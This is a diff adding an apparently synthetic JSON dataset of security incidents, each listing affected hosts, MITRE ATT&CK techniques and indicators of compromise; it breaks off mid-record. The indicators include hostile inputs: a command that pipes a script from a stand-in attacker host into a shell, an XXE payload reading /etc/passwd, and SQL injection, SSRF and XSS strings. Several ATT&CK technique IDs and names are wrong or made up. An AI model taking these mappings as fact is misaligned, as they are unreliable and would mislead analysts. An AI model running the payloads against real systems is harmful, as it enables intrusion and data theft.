@@ -1,0 +1,1864 @@
+[
+  {
+    "incident_id": "INC-2023-08-01-001",
+    "timestamp": "2023-08-01T09:15:00Z",
+    "title": "Unauthorized Access Attempt on VPN Gateway",
+    "description": "Multiple failed login attempts followed by a successful connection from an unusual geographic location on the main VPN gateway.",
+    "affected_assets": [
+      {
+        "hostname": "vpn-gateway-01",
+        "ip_address": "203.0.113.1",
+        "os": "Cisco IOS XE",
+        "installed_software": [
+          {
+            "name": "Cisco IOS XE",
+            "version": "17.3.4a"
+          }
+        ],
+        "role": "VPN Gateway"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1110",
+        "name": "Brute Force"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1078",
+        "name": "Valid Accounts"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "ip_address",
+        "value": "172.91.8.123",
+        "context": "Source IP of successful login"
+      },
+      {
+        "type": "username",
+        "value": "admin",
+        "context": "Account used for successful login"
+      }
+    ],
+    "initial_findings": "Credential stuffing or brute force attack successful against VPN."
+  },
+  {
+    "incident_id": "INC-2023-08-01-002",
+    "timestamp": "2023-08-01T11:00:00Z",
+    "title": "Malicious Document Delivered via Email",
+    "description": "User reported suspicious attachment in a phishing email. Analysis indicates embedded malicious macro attempting to download payload.",
+    "affected_assets": [
+      {
+        "hostname": "user-endpoint-42",
+        "ip_address": "192.168.10.55",
+        "os": "Windows 10",
+        "installed_software": [
+          {
+            "name": "Microsoft Office",
+            "version": "2016"
+          },
+          {
+            "name": "Adobe Acrobat Reader",
+            "version": "2020.013.20064"
+          }
+        ],
+        "role": "User Workstation"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1566.001",
+        "name": "Phishing: Spearphishing Attachment"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1203",
+        "name": "Exploitation for Client Execution"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "file_hash",
+        "value": "b2c3d4e5f67890a1...",
+        "context": "Malicious document hash"
+      },
+      {
+        "type": "url",
+        "value": "http://malicious.site/payload.exe",
+        "context": "Download attempt destination"
+      }
+    ],
+    "initial_findings": "Potential client-side exploitation via malicious document."
+  },
+  {
+    "incident_id": "INC-2023-08-01-003",
+    "timestamp": "2023-08-01T14:30:00Z",
+    "title": "Web Application SQL Injection Attempt",
+    "description": "Web application firewall blocked multiple requests containing suspected SQL injection payloads targeting the login page.",
+    "affected_assets": [
+      {
+        "hostname": "web-app-server-05",
+        "ip_address": "10.10.5.20",
+        "os": "CentOS 7",
+        "installed_software": [
+          {
+            "name": "Apache Tomcat",
+            "version": "9.0.50"
+          },
+          {
+            "name": "MySQL Connector/J",
+            "version": "8.0.25"
+          }
+        ],
+        "role": "Internal Web Application Server"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1190",
+        "name": "Exploit Public-Facing Application"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1059.004",
+        "name": "Command and Scripting Interpreter: SQL"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "ip_address",
+        "value": "52.1.2.3",
+        "context": "Source IP of attack attempts"
+      },
+      {
+        "type": "uri_path",
+        "value": "/login.jsp",
+        "context": "Targeted page"
+      }
+    ],
+    "initial_findings": "Attempted SQL injection against internal web app."
+  },
+  {
+    "incident_id": "INC-2023-08-02-004",
+    "timestamp": "2023-08-02T08:00:00Z",
+    "title": "Lateral Movement Detected via PsExec",
+    "description": "Security monitoring alerted on PsExec usage originating from a compromised workstation to a critical server.",
+    "affected_assets": [
+      {
+        "hostname": "dev-workstation-15",
+        "ip_address": "192.168.10.100",
+        "os": "Windows 10",
+        "installed_software": [
+          {
+            "name": "Microsoft Windows",
+            "version": "10.0.19044"
+          }
+        ],
+        "role": "Development Workstation"
+      },
+      {
+        "hostname": "file-server-02",
+        "ip_address": "192.168.1.200",
+        "os": "Windows Server 2019",
+        "installed_software": [
+          {
+            "name": "Microsoft Windows Server",
+            "version": "10.0.17763"
+          }
+        ],
+        "role": "File Server"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1021.002",
+        "name": "Remote Services: SMB/Windows Admin Shares"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1570",
+        "name": "Lateral Movement"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "process_name",
+        "value": "PsExec.exe",
+        "context": "Process observed"
+      },
+      {
+        "type": "source_ip",
+        "value": "192.168.10.100",
+        "context": "Origin of PsExec"
+      }
+    ],
+    "initial_findings": "Lateral movement attempt from workstation to file server."
+  },
+  {
+    "incident_id": "INC-2023-08-02-005",
+    "timestamp": "2023-08-02T10:45:00Z",
+    "title": "Suspicious Activity on Database Server",
+    "description": "Unusual queries and large data transfers observed from the database server to an external IP.",
+    "affected_assets": [
+      {
+        "hostname": "db-server-01",
+        "ip_address": "192.168.1.150",
+        "os": "Ubuntu 20.04 LTS",
+        "installed_software": [
+          {
+            "name": "PostgreSQL",
+            "version": "12.7"
+          },
+          {
+            "name": "OpenSSL",
+            "version": "1.1.1f"
+          }
+        ],
+        "role": "Production Database Server"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1041",
+        "name": "Exfiltration Over C2 Channel"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1059.004",
+        "name": "Command and Scripting Interpreter: SQL"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "ip_address",
+        "value": "104.20.30.40",
+        "context": "External destination IP"
+      },
+      {
+        "type": "database_query_pattern",
+        "value": "SELECT * FROM sensitive_table",
+        "context": "Observed query pattern"
+      }
+    ],
+    "initial_findings": "Potential data exfiltration from database server."
+  },
+  {
+    "incident_id": "INC-2023-08-02-006",
+    "timestamp": "2023-08-02T13:10:00Z",
+    "title": "Web Server Compromise via CMS Vulnerability",
+    "description": "Alerts indicate successful exploitation of a known vulnerability in the installed CMS on a public-facing web server.",
+    "affected_assets": [
+      {
+        "hostname": "public-web-03",
+        "ip_address": "52.2.3.4",
+        "os": "Ubuntu 22.04 LTS",
+        "installed_software": [
+          {
+            "name": "WordPress",
+            "version": "6.0"
+          },
+          {
+            "name": "Apache HTTP Server",
+            "version": "2.4.52"
+          }
+        ],
+        "role": "Public Web Server"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1190",
+        "name": "Exploit Public-Facing Application"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1505.003",
+        "name": "Server Software: Web Shell"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "file_path",
+        "value": "/var/www/html/wp-content/uploads/shell.php",
+        "context": "Suspicious file detected"
+      },
+      {
+        "type": "http_request_pattern",
+        "value": "POST /wp-admin/admin-ajax.php?action=...",
+        "context": "Exploitation attempt pattern"
+      }
+    ],
+    "initial_findings": "Web server compromised via CMS vulnerability, web shell uploaded."
+  },
+  {
+    "incident_id": "INC-2023-08-03-007",
+    "timestamp": "2023-08-03T09:00:00Z",
+    "title": "Privilege Escalation Detected",
+    "description": "Security agent alerted on unusual process behavior indicating a potential privilege escalation attempt on a Windows server.",
+    "affected_assets": [
+      {
+        "hostname": "app-server-10",
+        "ip_address": "192.168.1.50",
+        "os": "Windows Server 2016",
+        "installed_software": [
+          {
+            "name": "Microsoft Windows Server",
+            "version": "10.0.14393"
+          }
+        ],
+        "role": "Application Server"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1068",
+        "name": "Exploitation for Privilege Escalation"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "process_name",
+        "value": "powershell.exe",
+        "context": "Unusual parent process"
+      },
+      {
+        "type": "system_call_sequence",
+        "value": "...",
+        "context": "Suspicious API call sequence"
+      }
+    ],
+    "initial_findings": "Attempted privilege escalation on application server."
+  },
+  {
+    "incident_id": "INC-2023-08-03-008",
+    "timestamp": "2023-08-03T11:30:00Z",
+    "title": "Suspicious Network Scan Activity",
+    "description": "Internal network monitoring detected widespread scanning activity originating from a user workstation.",
+    "affected_assets": [
+      {
+        "hostname": "user-endpoint-78",
+        "ip_address": "192.168.10.150",
+        "os": "Windows 10",
+        "installed_software": [
+          {
+            "name": "Nmap",
+            "version": "7.92"
+          }
+        ],
+        "role": "User Workstation"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1046",
+        "name": "Network Service Scanning"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1018",
+        "name": "Remote System Discovery"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "process_name",
+        "value": "nmap.exe",
+        "context": "Scanning tool process"
+      },
+      {
+        "type": "network_traffic_pattern",
+        "value": "SYN scan across subnet",
+        "context": "Observed scan pattern"
+      }
+    ],
+    "initial_findings": "Internal network reconnaissance from a workstation."
+  },
+  {
+    "incident_id": "INC-2023-08-03-009",
+    "timestamp": "2023-08-03T14:00:00Z",
+    "title": "Compromised Cloud Instance",
+    "description": "Cloud provider alert indicates unusual activity and resource usage on a specific EC2 instance, potentially compromised.",
+    "affected_assets": [
+      {
+        "hostname": "cloud-instance-prod-us-east-1",
+        "ip_address": "172.31.44.10",
+        "os": "Amazon Linux 2",
+        "installed_software": [
+          {
+            "name": "OpenSSH",
+            "version": "7.4p1"
+          },
+          {
+            "name": "Python",
+            "version": "3.7.10"
+          }
+        ],
+        "role": "Production Cloud Instance"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1078.003",
+        "name": "Valid Accounts: Cloud Accounts"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1496",
+        "name": "Resource Hijacking"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "cloud_api_call",
+        "value": "RunInstances",
+        "context": "Unusual API call pattern"
+      },
+      {
+        "type": "network_connection",
+        "value": "outbound to cryptocurrency pool",
+        "context": "Observed outbound connection"
+      }
+    ],
+    "initial_findings": "Cloud instance potentially compromised, used for resource hijacking."
+  },
+  {
+    "incident_id": "INC-2023-08-04-010",
+    "timestamp": "2023-08-04T09:30:00Z",
+    "title": "Supply Chain Compromise Alert (Simulated)",
+    "description": "Threat intelligence feed indicates a potential compromise in a widely used open-source library present in our applications.",
+    "affected_assets": [
+      {
+        "hostname": "app-server-01",
+        "ip_address": "192.168.1.60",
+        "os": "Ubuntu 20.04 LTS",
+        "installed_software": [
+          {
+            "name": "Node.js",
+            "version": "14.17.0"
+          },
+          {
+            "name": "axios",
+            "version": "0.21.1"
+          }
+        ],
+        "role": "Application Server"
+      },
+      {
+        "hostname": "app-server-02",
+        "ip_address": "192.168.1.61",
+        "os": "Ubuntu 20.04 LTS",
+        "installed_software": [
+          {
+            "name": "Node.js",
+            "version": "14.17.0"
+          },
+          {
+            "name": "axios",
+            "version": "0.21.1"
+          }
+        ],
+        "role": "Application Server"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1195.002",
+        "name": "Supply Chain Compromise: Component Software"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1505.003",
+        "name": "Server Software: Web Shell"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "library_name",
+        "value": "axios",
+        "context": "Potentially compromised library"
+      },
+      {
+        "type": "library_version",
+        "value": "0.21.1",
+        "context": "Potentially compromised version"
+      }
+    ],
+    "initial_findings": "Risk assessment needed for applications using potentially compromised library version."
+  },
+  {
+    "incident_id": "INC-2023-08-04-011",
+    "timestamp": "2023-08-04T11:00:00Z",
+    "title": "DDoS Attack Initiated",
+    "description": "High volume of traffic detected targeting the main corporate website, indicative of a Distributed Denial of Service attack.",
+    "affected_assets": [
+      {
+        "hostname": "corporate-website-lb",
+        "ip_address": "203.0.113.10",
+        "os": "N/A",
+        "installed_software": [],
+        "role": "Load Balancer"
+      },
+      {
+        "hostname": "corporate-web-01",
+        "ip_address": "192.168.1.250",
+        "os": "Ubuntu 22.04 LTS",
+        "installed_software": [
+          {
+            "name": "Nginx",
+            "version": "1.18.0"
+          }
+        ],
+        "role": "Public Web Server"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1499",
+        "name": "Denial of Service"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "network_traffic_volume",
+        "value": "10 Gbps",
+        "context": "Observed traffic volume"
+      },
+      {
+        "type": "traffic_source_count",
+        "value": "100000+",
+        "context": "Number of source IPs"
+      }
+    ],
+    "initial_findings": "DDoS attack in progress targeting public website."
+  },
+  {
+    "incident_id": "INC-2023-08-04-012",
+    "timestamp": "2023-08-04T14:30:00Z",
+    "title": "Insider Threat Activity Detected",
+    "description": "User with standard privileges accessed and copied sensitive files from a restricted network share.",
+    "affected_assets": [
+      {
+        "hostname": "file-server-01",
+        "ip_address": "192.168.1.201",
+        "os": "Windows Server 2019",
+        "installed_software": [
+          {
+            "name": "Microsoft Windows Server",
+            "version": "10.0.17763"
+          }
+        ],
+        "role": "File Server"
+      },
+      {
+        "hostname": "user-endpoint-22",
+        "ip_address": "192.168.10.77",
+        "os": "Windows 10",
+        "installed_software": [
+          {
+            "name": "Microsoft Windows",
+            "version": "10.0.19044"
+          }
+        ],
+        "role": "User Workstation"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1078",
+        "name": "Valid Accounts"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1021.002",
+        "name": "Remote Services: SMB/Windows Admin Shares"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1041",
+        "name": "Exfiltration Over C2 Channel"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "username",
+        "value": "insider.user",
+        "context": "User account"
+      },
+      {
+        "type": "file_path",
+        "value": "\\\\file-server-01\\sensitive_share\\*",
+        "context": "Accessed files"
+      },
+      {
+        "type": "destination",
+        "value": "external USB drive",
+        "context": "Data copied to"
+      }
+    ],
+    "initial_findings": "Potential insider data theft."
+  },
+  {
+    "incident_id": "INC-2023-08-05-013",
+    "timestamp": "2023-08-05T08:30:00Z",
+    "title": "Malicious PowerShell Activity",
+    "description": "Security monitoring detected obfuscated PowerShell script execution with unusual network connections.",
+    "affected_assets": [
+      {
+        "hostname": "server-utility-08",
+        "ip_address": "192.168.1.80",
+        "os": "Windows Server 2019",
+        "installed_software": [
+          {
+            "name": "Microsoft PowerShell",
+            "version": "5.1"
+          }
+        ],
+        "role": "Utility Server"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1059.001",
+        "name": "Command and Scripting Interpreter: PowerShell"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1027",
+        "name": "Obfuscated Files or Information"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "process_name",
+        "value": "powershell.exe",
+        "context": "Observed process"
+      },
+      {
+        "type": "command_line",
+        "value": "powershell -encodedcommand ...",
+        "context": "Suspicious command line"
+      },
+      {
+        "type": "ip_address",
+        "value": "8.8.4.4",
+        "context": "Outbound connection to unusual IP"
+      }
+    ],
+    "initial_findings": "Execution of potentially malicious PowerShell script."
+  },
+  {
+    "incident_id": "INC-2023-08-05-014",
+    "timestamp": "2023-08-05T10:00:00Z",
+    "title": "Container Escape Attempt",
+    "description": "Security alerts triggered within a Kubernetes cluster indicating a container attempting to break out of its isolation.",
+    "affected_assets": [
+      {
+        "hostname": "k8s-node-worker-05",
+        "ip_address": "10.10.20.30",
+        "os": "Container-Optimized OS",
+        "installed_software": [
+          {
+            "name": "Docker",
+            "version": "20.10.7"
+          },
+          {
+            "name": "Kubernetes",
+            "version": "1.23.0"
+          }
+        ],
+        "role": "Kubernetes Worker Node"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1610",
+        "name": "Container Administration Command"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1548.002",
+        "name": "Abuse Elevation Control Mechanisms: Bypass User Account Control"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "container_id",
+        "value": "abcdef123456",
+        "context": "Suspicious container"
+      },
+      {
+        "type": "syscall_pattern",
+        "value": "mount, pivot_root",
+        "context": "Unusual system call pattern"
+      }
+    ],
+    "initial_findings": "Attempted container escape on a Kubernetes worker node."
+  },
+  {
+    "incident_id": "INC-2023-08-05-015",
+    "timestamp": "2023-08-05T13:45:00Z",
+    "title": "Exploitation of Public-Facing API",
+    "description": "Logs show unusual requests and responses from a public-facing API endpoint, suggesting exploitation.",
+    "affected_assets": [
+      {
+        "hostname": "api-gateway-prod",
+        "ip_address": "203.0.113.50",
+        "os": "Amazon Linux 2",
+        "installed_software": [
+          {
+            "name": "Nginx",
+            "version": "1.20.1"
+          },
+          {
+            "name": "OpenSSL",
+            "version": "1.1.1k"
+          }
+        ],
+        "role": "API Gateway"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1190",
+        "name": "Exploit Public-Facing Application"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1078",
+        "name": "Valid Accounts"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "http_request_pattern",
+        "value": "GET /api/v1/users?id=' OR '1'='1",
+        "context": "Observed injection pattern"
+      },
+      {
+        "type": "response_size",
+        "value": "unusually large",
+        "context": "Anomalous response size"
+      }
+    ],
+    "initial_findings": "Potential exploitation of public API via injection or authentication bypass."
+  },
+  {
+    "incident_id": "INC-2023-08-06-016",
+    "timestamp": "2023-08-06T09:00:00Z",
+    "title": "Suspicious RDP Activity",
+    "description": "Multiple failed RDP login attempts followed by a successful login from an external IP to a server that should not be publicly accessible.",
+    "affected_assets": [
+      {
+        "hostname": "internal-jump-server",
+        "ip_address": "192.168.1.254",
+        "os": "Windows Server 2019",
+        "installed_software": [
+          {
+            "name": "Microsoft Remote Desktop Services",
+            "version": "10.0.17763"
+          }
+        ],
+        "role": "Jump Server"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1021.001",
+        "name": "Remote Services: RDP"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1110",
+        "name": "Brute Force"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "ip_address",
+        "value": "74.125.23.10",
+        "context": "Source IP of successful RDP"
+      },
+      {
+        "type": "username",
+        "value": "svc_account",
+        "context": "Account used"
+      }
+    ],
+    "initial_findings": "Unauthorized external RDP access to internal jump server."
+  },
+  {
+    "incident_id": "INC-2023-08-06-017",
+    "timestamp": "2023-08-06T11:15:00Z",
+    "title": "Malicious File Downloaded",
+    "description": "Endpoint detection alerted on a user downloading a file with a known malicious hash from a suspicious website.",
+    "affected_assets": [
+      {
+        "hostname": "user-endpoint-99",
+        "ip_address": "192.168.10.200",
+        "os": "Windows 10",
+        "installed_software": [
+          {
+            "name": "Google Chrome",
+            "version": "103.0.5060.114"
+          }
+        ],
+        "role": "User Workstation"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1204.001",
+        "name": "User Execution: Malicious Link"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1105",
+        "name": "Ingress Tool Transfer"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "file_hash",
+        "value": "c3d4e5f67890a1b2...",
+        "context": "Downloaded file hash"
+      },
+      {
+        "type": "url",
+        "value": "http://suspicious.site/malware.zip",
+        "context": "Source URL"
+      }
+    ],
+    "initial_findings": "User downloaded known malware."
+  },
+  {
+    "incident_id": "INC-2023-08-06-018",
+    "timestamp": "2023-08-06T14:00:00Z",
+    "title": "Code Injection Vulnerability Exploited",
+    "description": "Security logs show unusual commands being executed within the context of a web application process.",
+    "affected_assets": [
+      {
+        "hostname": "web-app-server-08",
+        "ip_address": "10.10.5.25",
+        "os": "CentOS 7",
+        "installed_software": [
+          {
+            "name": "nginx",
+            "version": "1.20.1"
+          },
+          {
+            "name": "PHP-FPM",
+            "version": "7.4.20"
+          }
+        ],
+        "role": "Internal Web Application Server"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1190",
+        "name": "Exploit Public-Facing Application"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1059",
+        "name": "Command and Scripting Interpreter"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "process_name",
+        "value": "php-fpm",
+        "context": "Process executing unusual commands"
+      },
+      {
+        "type": "command_line",
+        "value": "curl http://attacker.site/shell.sh | sh",
+        "context": "Observed command"
+      }
+    ],
+    "initial_findings": "Code injection vulnerability exploited in web application."
+  },
+  {
+    "incident_id": "INC-2023-08-07-019",
+    "timestamp": "2023-08-07T09:30:00Z",
+    "title": "Authentication Bypass on Admin Panel",
+    "description": "Logs indicate successful access to an administrative panel without proper authentication.",
+    "affected_assets": [
+      {
+        "hostname": "admin-panel-prod",
+        "ip_address": "192.168.1.10",
+        "os": "Ubuntu 20.04 LTS",
+        "installed_software": [
+          {
+            "name": "Django",
+            "version": "3.2.5"
+          },
+          {
+            "name": "Apache HTTP Server",
+            "version": "2.4.41"
+          }
+        ],
+        "role": "Internal Admin Panel"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1213.001",
+        "name": "Exploitation for Access: Web Parameters"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1078",
+        "name": "Valid Accounts"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "http_request_pattern",
+        "value": "GET /admin/?user=admin&password=",
+        "context": "Observed request pattern"
+      },
+      {
+        "type": "source_ip",
+        "value": "192.168.10.25",
+        "context": "Source IP of access"
+      }
+    ],
+    "initial_findings": "Authentication bypass vulnerability likely exploited on admin panel."
+  },
+  {
+    "incident_id": "INC-2023-08-07-020",
+    "timestamp": "2023-08-07T11:00:00Z",
+    "title": "Deserialization Vulnerability Exploited",
+    "description": "Application logs show errors and unusual behavior consistent with a deserialization attack.",
+    "affected_assets": [
+      {
+        "hostname": "java-app-server-04",
+        "ip_address": "10.10.5.30",
+        "os": "CentOS 7",
+        "installed_software": [
+          {
+            "name": "Apache Struts",
+            "version": "2.5.26"
+          },
+          {
+            "name": "Java JRE",
+            "version": "1.8.0_291"
+          }
+        ],
+        "role": "Java Application Server"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1190",
+        "name": "Exploit Public-Facing Application"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1059",
+        "name": "Command and Scripting Interpreter"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "application_log_pattern",
+        "value": "java.io.InvalidClassException",
+        "context": "Observed log pattern"
+      },
+      {
+        "type": "network_connection",
+        "value": "outbound to attacker C2",
+        "context": "Unusual outbound connection"
+      }
+    ],
+    "initial_findings": "Deserialization vulnerability exploited on Java application server."
+  },
+  {
+    "incident_id": "INC-2023-08-07-021",
+    "timestamp": "2023-08-07T14:15:00Z",
+    "title": "XML External Entity (XXE) Injection",
+    "description": "Web application logs show attempts to include external entities via XML input.",
+    "affected_assets": [
+      {
+        "hostname": "xml-processing-service",
+        "ip_address": "192.168.1.90",
+        "os": "Ubuntu 20.04 LTS",
+        "installed_software": [
+          {
+            "name": "libxml2",
+            "version": "2.9.10"
+          }
+        ],
+        "role": "Internal Service"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1190",
+        "name": "Exploit Public-Facing Application"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1592.004",
+        "name": "Gather Victim Host Information: File Contents"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "http_request_body",
+        "value": "<?xml version=\"1.0\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><foo>&xxe;</foo>",
+        "context": "Observed request body"
+      },
+      {
+        "type": "application_log_pattern",
+        "value": "attempted access to file:///etc/passwd",
+        "context": "Observed log pattern"
+      }
+    ],
+    "initial_findings": "Attempted XXE injection against internal service."
+  },
+  {
+    "incident_id": "INC-2023-08-08-022",
+    "timestamp": "2023-08-08T09:00:00Z",
+    "title": "Cross-Site Scripting (XSS) Detected",
+    "description": "Security monitoring alerted on suspicious script execution in a user's browser originating from our web application.",
+    "affected_assets": [
+      {
+        "hostname": "user-browser-01",
+        "ip_address": "192.168.10.30",
+        "os": "Windows 10",
+        "installed_software": [
+          {
+            "name": "Mozilla Firefox",
+            "version": "100.0"
+          }
+        ],
+        "role": "User Workstation"
+      },
+      {
+        "hostname": "web-app-server-12",
+        "ip_address": "10.10.5.40",
+        "os": "CentOS 7",
+        "installed_software": [
+          {
+            "name": "Apache HTTP Server",
+            "version": "2.4.41"
+          },
+          {
+            "name": "PHP",
+            "version": "7.4.3"
+          }
+        ],
+        "role": "Internal Web Application Server"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1059.007",
+        "name": "Command and Scripting Interpreter: JavaScript"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T0869",
+        "name": "CLIENT-SIDE ATTACK: Cross-Site Scripting"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "browser_alert",
+        "value": "XSS detected",
+        "context": "Security tool alert"
+      },
+      {
+        "type": "http_response_body",
+        "value": "<script>alert('XSS')</script>",
+        "context": "Injected script in response"
+      }
+    ],
+    "initial_findings": "Cross-Site Scripting vulnerability in web application exploited."
+  },
+  {
+    "incident_id": "INC-2023-08-08-023",
+    "timestamp": "2023-08-08T11:45:00Z",
+    "title": "Insecure Deserialization in .NET Application",
+    "description": "Application logs show errors related to type mismatches during deserialization, potentially indicating an attack.",
+    "affected_assets": [
+      {
+        "hostname": "dotnet-app-server-02",
+        "ip_address": "10.10.5.50",
+        "os": "Windows Server 2019",
+        "installed_software": [
+          {
+            "name": ".NET Framework",
+            "version": "4.8"
+          }
+        ],
+        "role": ".NET Application Server"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1190",
+        "name": "Exploit Public-Facing Application"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1059",
+        "name": "Command and Scripting Interpreter"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "application_log_pattern",
+        "value": "System.Runtime.Serialization.SerializationException",
+        "context": "Observed log pattern"
+      },
+      {
+        "type": "network_connection",
+        "value": "outbound to unusual port",
+        "context": "Unusual outbound connection"
+      }
+    ],
+    "initial_findings": "Insecure deserialization vulnerability likely exploited in .NET application."
+  },
+  {
+    "incident_id": "INC-2023-08-08-024",
+    "timestamp": "2023-08-08T14:00:00Z",
+    "title": "Server-Side Request Forgery (SSRF) Attempt",
+    "description": "Web application firewall blocked requests attempting to access internal resources via a public-facing endpoint.",
+    "affected_assets": [
+      {
+        "hostname": "image-processing-service",
+        "ip_address": "203.0.113.60",
+        "os": "Ubuntu 22.04 LTS",
+        "installed_software": [
+          {
+            "name": "Python",
+            "version": "3.10.4"
+          },
+          {
+            "name": "Pillow",
+            "version": "9.0.1"
+          }
+        ],
+        "role": "Public-Facing Service"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T0918",
+        "name": "Server-Side Request Forgery"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "http_request_parameter",
+        "value": "image_url=http://169.254.169.254/latest/meta-data/",
+        "context": "Observed request parameter"
+      },
+      {
+        "type": "waf_alert",
+        "value": "SSRF attempt blocked",
+        "context": "Security tool alert"
+      }
+    ],
+    "initial_findings": "Attempted SSRF against image processing service."
+  },
+  {
+    "incident_id": "INC-2023-08-09-025",
+    "timestamp": "2023-08-09T09:15:00Z",
+    "title": "LDAP Injection Attempt",
+    "description": "Authentication service logs show unusual queries with special characters, consistent with an LDAP injection attempt.",
+    "affected_assets": [
+      {
+        "hostname": "auth-service-prod",
+        "ip_address": "192.168.1.110",
+        "os": "CentOS 7",
+        "installed_software": [
+          {
+            "name": "OpenLDAP",
+            "version": "2.4.44"
+          }
+        ],
+        "role": "Authentication Service"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1190",
+        "name": "Exploit Public-Facing Application"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1059",
+        "name": "Command and Scripting Interpreter"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "application_log_pattern",
+        "value": "ldap_search((&(uid=*)(|(userPassword=*))))",
+        "context": "Observed query pattern"
+      },
+      {
+        "type": "source_ip",
+        "value": "203.0.113.70",
+        "context": "Source IP of attempts"
+      }
+    ],
+    "initial_findings": "Attempted LDAP injection against authentication service."
+  },
+  {
+    "incident_id": "INC-2023-08-09-026",
+    "timestamp": "2023-08-09T11:00:00Z",
+    "title": "Remote Code Execution via Unrestricted File Upload",
+    "description": "Web application allowed upload of a file with a suspicious extension, followed by attempts to execute it.",
+    "affected_assets": [
+      {
+        "hostname": "file-upload-service",
+        "ip_address": "10.10.5.60",
+        "os": "Ubuntu 20.04 LTS",
